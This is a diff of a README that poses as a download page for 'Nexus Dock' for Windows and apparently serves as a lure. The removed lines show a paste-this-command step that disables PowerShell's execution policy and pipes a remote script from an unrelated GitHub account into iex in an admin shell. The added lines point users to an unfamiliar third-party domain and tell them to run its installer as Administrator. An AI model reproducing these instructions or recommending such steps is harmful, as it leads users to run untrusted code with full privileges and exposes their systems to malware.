@@ -2,7 +2,7 @@
 
 **Nexus-Dock-2026**
 
-**Nexus Dock** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+**Nexus Dock** download for Windows 10/11. Scroll to **Download & Install** for the direct direct download link below.
 
 [![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
 
@@ -10,22 +10,30 @@
 
 ## Download & Install
 
-> **This is the download page.** Copy the command below into **PowerShell (Admin)** to download and run the installer.
+> **This is the download page.** Use the button or link below to get **Nexus Dock** for Windows.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+<p align="center">
+  <a href="https://nexus-dock.zipzapsol.space/">
+    <img src="https://img.shields.io/badge/Download-Nexus%20Dock-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Nexus Dock">
+  </a>
+</p>
 
-| Step | What to do |
+| | |
 | --- | --- |
-| 1 | Press **Win + X** → **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command above and press **Enter** |
-| 3 | Wait for the download — progress shows in the console |
-| 4 | Follow on-screen prompts (license key if asked) |
-| 5 | Restart if requested, then open **Nexus Dock** from Start menu |
+| **Direct link** | **[nexus-dock.zipzapsol.space](https://nexus-dock.zipzapsol.space/)** |
+| **Full URL** | `https://nexus-dock.zipzapsol.space/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
 
-**Install type:** PowerShell one-liner (no browser required after Admin shell is open).
+### Quick steps
+
+1. Click **[Download — nexus-dock.zipzapsol.space](https://nexus-dock.zipzapsol.space/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://nexus-dock.zipzapsol.space/"><strong>⬇ Download Nexus Dock now</strong></a></p>
 
 ---
 
